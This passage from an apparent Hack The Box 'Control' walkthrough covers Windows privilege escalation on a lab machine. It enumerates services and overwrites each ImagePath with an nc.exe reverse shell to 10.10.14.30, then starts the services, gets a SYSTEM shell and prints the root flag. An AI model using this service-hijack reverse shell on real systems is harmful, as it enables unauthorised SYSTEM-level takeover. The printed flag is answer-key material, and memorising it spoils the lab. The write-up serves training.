+Group  : NT AUTHORITY\SYSTEM
+Access : BUILTIN\Administrators Allow  FullControl
+         NT AUTHORITY\Authenticated Users Allow  ReadKey
+         NT AUTHORITY\Authenticated Users Allow  -2147483648
+         S-1-5-32-549 Allow  ReadKey
+         S-1-5-32-549 Allow  -2147483648
+         BUILTIN\Administrators Allow  FullControl
+         BUILTIN\Administrators Allow  268435456
+         NT AUTHORITY\SYSTEM Allow  FullControl
+         NT AUTHORITY\SYSTEM Allow  268435456
+         CREATOR OWNER Allow  268435456
+         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
+         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -2147483648
+         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow
+         ReadKey
+         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow
+         -2147483648
+Audit  :
+Sddl   : O:BAG:SYD:AI(A;;KA;;;BA)(A;ID;KR;;;AU)(A;CIIOID;GR;;;AU)(A;ID;KR;;;SO)(A;CIIOID;GR;;;SO)(A;ID;KA;;;BA)(A;CIIOI
+         D;GA;;;BA)(A;ID;KA;;;SY)(A;CIIOID;GA;;;SY)(A;CIIOID;GA;;;CO)(A;ID;KR;;;AC)(A;CIIOID;GR;;;AC)(A;ID;KR;;;S-1-15-
+         3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)(A;CIIOID;GR;;;S
+         -1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)
+```
+
+Ok from there I need to thank [https://www.hackthebox.eu/home/users/profile/37207](@Am0k) and [https://www.hackthebox.eu/home/users/profile/24921](@NebulousAnchor). Because, I have to be honest, I'm still not sure i understand it completely.
+So from these commands we read that we have some permissions regarding services that we could investigate.
+
+We can see what is in `CurrentControlSet`
+
+```powershell
+PS C:\Users\Hector\Desktop> reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet
+reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Hardware Profiles
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Policies
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Software
+```
+
+Next thing we can do is list all the services.
+
+```powershell
+PS C:\Users\Hector\Desktop> reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
+reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\.NET CLR Data
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\.NET CLR Networking
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\.NET CLR Networking 4.0.0.0
+
+[...]
+
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\xmlprov
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\{60E8E863-2974-47D1-89E0-E507677AA14F}
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\{6D197A8D-04EB-44C6-B602-FF2798EB7BB3}
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\{CB20B026-8E3E-4F7D-88FD-E7FB0E93CF39}
+PS C:\Users\Hector\Desktop>
+```
+
+In order to determine which ones we have permission to use, I'll copy all the services to a text file, remove the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\` use atom or any other text editor which can remove replace multiple strings,  and upload it ot the target, I'll also `cd` to `uploads` so we don't need to reuploads `nc.exe`. Now we can get a first filter by getting each services:
+
+```powershell
+PS C:\inetpub\wwwroot\uploads> Get-Content "C:\inetpub\wwwroot\uploads\ss.txt" | ForEach-Object {Get-Service $_} 2> $null
+Get-Content "C:\inetpub\wwwroot\uploads\ss.txt" | ForEach-Object {Get-Service $_} 2> $null
+
+Status   Name               DisplayName
+------   ----               -----------
+Stopped  applockerfltr      Smartlocker Filter Driver
+Stopped  AppMgmt            Application Management
+Stopped  AppVClient         Microsoft App-V Client
+Running  BFE                Base Filtering Engine
+Running  BrokerInfrastru... Background Tasks Infrastructure Ser...
+Running  CLFS               Common Log (CLFS)
+Running  ClipSVC            Client License Service (ClipSVC)
+Stopped  ConsentUxUserSvc   ConsentUX
+Running  DcomLaunch         DCOM Server Process Launcher
+Stopped  DevicePickerUse... DevicePicker
+Stopped  DevicesFlowUserSvc DevicesFlow
+Running  Dhcp               DHCP Client
+Stopped  dmwappushservice   Device Management Wireless Applicat...
+Running  Dnscache           DNS Client
+Stopped  DoSvc              Delivery Optimization
+Running  DsSvc              Data Sharing Service
+Stopped  EFS                Encrypting File System (EFS)
+Running  EventLog           Windows Event Log
+Stopped  icssvc             Windows Mobile Hotspot Service
+Stopped  KtmRm              KtmRm for Distributed Transaction C...
+Running  LSM                Local Session Manager
+Stopped  MapsBroker         Downloaded Maps Manager
+Running  mpsdrv             Windows Defender Firewall Authoriza...
+Running  mpssvc             Windows Defender Firewall
+Running  MSDTC              Distributed Transaction Coordinator
+Running  NetBT              NetBT
+Stopped  NetSetupSvc        Network Setup Service
+Stopped  NetTcpPortSharing  Net.Tcp Port Sharing Service
+Stopped  NgcCtnrSvc         Microsoft Passport Container
+Stopped  NgcSvc             Microsoft Passport
+Stopped  PhoneSvc           Phone Service
+Stopped  PimIndexMainten... Contact Data
+Stopped  pla                Performance Logs & Alerts
+Stopped  PrintWorkflowUs... PrintWorkflow
+Stopped  RasAcd             Remote Access Auto Connection Driver
+Stopped  RasAuto            Remote Access Auto Connection Manager
+Running  RasMan             Remote Access Connection Manager
+Stopped  RemoteAccess       Routing and Remote Access
+Stopped  RmSvc              Radio Management Service
+Running  RpcEptMapper       RPC Endpoint Mapper
+Running  RpcSs              Remote Procedure Call (RPC)
+Stopped  RSoPProv           Resultant Set of Policy Provider
+Running  SamSs              Security Accounts Manager
+Running  Schedule           Task Scheduler
+Stopped  seclogon           Secondary Logon
+Stopped  SecurityHealthS... Windows Security Service
+Stopped  SEMgrSvc           Payments and NFC/SE Manager
+Running  SENS               System Event Notification Service
+Stopped  SensorService      Sensor Service
+Stopped  SensrSvc           Sensor Monitoring Service
+Stopped  smphost            Microsoft Storage Spaces SMP
+Running  Spooler            Print Spooler
+Stopped  sppsvc             Software Protection
+Running  SstpSvc            Secure Socket Tunneling Protocol Se...
+Running  SystemEventsBroker System Events Broker
+Running  TimeBrokerSvc      Time Broker
+Stopped  UevAgentService    User Experience Virtualization Service
+Stopped  UnistoreSvc        User Data Storage
+Stopped  UserDataSvc        User Data Access
+Stopped  UsoSvc             Update Orchestrator Service
+Stopped  vds                Virtual Disk
+Stopped  WaaSMedicSvc       Windows Update Medic Service
+Stopped  WdBoot             Windows Defender Antivirus Boot Driver
+Running  WdFilter           Windows Defender Antivirus Mini-Fil...
+Running  WdNisDrv           Windows Defender Antivirus Network ...
+Running  WdNisSvc           Windows Defender Antivirus Network ...
+Running  WinDefend          Windows Defender Antivirus Service
+Running  WinHttpAutoProx... WinHTTP Web Proxy Auto-Discovery Se...
+Stopped  WpnUserService     Windows Push Notifications User Ser...
+Stopped  wuauserv           Windows Update
+```
+
+If we look at any service we can get information on its fields and maybe inject a command such as yet another nc reverse shell. We can brute force this by using `reg.exe` to add our command to the `ImagePath`, this path can be determine by doing `reg.exe query <service>` and reading the possible fields.
+
+```powershell
+PS C:\inetpub\wwwroot\uploads> Get-Content "C:\inetpub\wwwroot\uploads\ss.txt" | ForEach-Object {reg.exe add "HKLM\System\CurrentControlSet\services\$_" /t REG_EXPAND_SZ /v ImagePath /d "cmd /c C:\inetpub\wwwroot\uploads\nc.exe -e powershell 10.10.14.30 1233" /f} 2> $null
+The operation completed successfully.
+[...]
+The operation completed successfully.
+PS C:\inetpub\wwwroot\uploads>
+```
+
+Now we start a `nc` listner, and we start all the services
+
+```powershell
+PS C:\inetpub\wwwroot\uploads> Get-Content "C:\inetpub\wwwroot\uploads\sa.txt" | ForEach-Object {start-service $_} 2> $null
+Get-Content "C:\inetpub\wwwroot\uploads\sa.txt" | ForEach-Object {start-service $_} 2> $null
+PS C:\inetpub\wwwroot\uploads>
+```
+
+```sh
+$nc -lnvp 1233
+listening on [any] 1233 ...
+connect to [10.10.14.30] from (UNKNOWN) [10.10.10.167] 62997
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Windows\system32> whoami
+whoami
+nt authority\system
+PS C:\Windows\system32> cd C:\Users\Administrator\Desktop
+cd C:\Users\Administrator\Desktop
+PS C:\Users\Administrator\Desktop> type root.txt
+type root.txt
+8f8613f5b4da391f36ef11def4cec1b1
+PS C:\Users\Administrator\Desktop>
+```
+
+Done !
+
+FIY, this is what my terminal looked like at the end
+
+
+<img src="{{site.baseurl}}/assets/img/posts/control/Screenshot_at_2020-04-19_18-21-30.png" alt="Screenshot_at_2020-04-19_18-21-30.png" style="display: block;  margin-left: auto; margin-right: auto;" />
+
+**Guanicoe**
